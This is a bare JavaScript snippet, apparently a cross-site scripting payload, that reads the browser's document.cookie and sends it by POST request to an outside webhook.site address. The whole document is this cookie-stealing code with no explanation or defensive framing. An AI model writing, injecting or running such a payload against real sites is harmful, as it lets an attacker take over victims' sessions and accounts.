fetch("https://webhook.site/807b9d8f-40ce-4758-9119-f2895323714d/receive", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ cookie: document.cookie })
});
